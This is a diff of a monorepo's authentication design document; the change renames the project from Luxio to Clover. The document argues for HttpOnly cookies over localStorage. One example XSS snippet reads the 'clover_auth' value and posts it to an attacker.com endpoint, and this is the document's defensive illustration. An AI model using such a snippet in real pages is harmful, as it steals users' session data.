@@ -2,7 +2,7 @@
 
 ## Overview
 
-This document describes the secure authentication implementation used across the Luxio monorepo. Our approach prioritizes security by using **HttpOnly cookies** for session management instead of storing sensitive data in `localStorage`.
+This document describes the secure authentication implementation used across the Clover monorepo. Our approach prioritizes security by using **HttpOnly cookies** for session management instead of storing sensitive data in `localStorage`.
 
 ## Security Concerns with localStorage
 
@@ -16,7 +16,7 @@ This document describes the secure authentication implementation used across the
 Example attack scenario:
 ```javascript
 // Malicious script injected via XSS can steal all auth data
-const userData = localStorage.getItem('luxio_auth');
+const userData = localStorage.getItem('clover_auth');
 fetch('https://attacker.com/steal', {
   method: 'POST',
   body: userData
@@ -252,7 +252,7 @@ public class SecurityConfig {
 describe('Authentication Security', () => {
   test('should not store user data in localStorage', () => {
     authStore.setUser(mockUser);
-    expect(localStorage.getItem('luxio_auth')).toBeNull();
+    expect(localStorage.getItem('clover_auth')).toBeNull();
   });
 
   test('should clear state on logout', async () => {
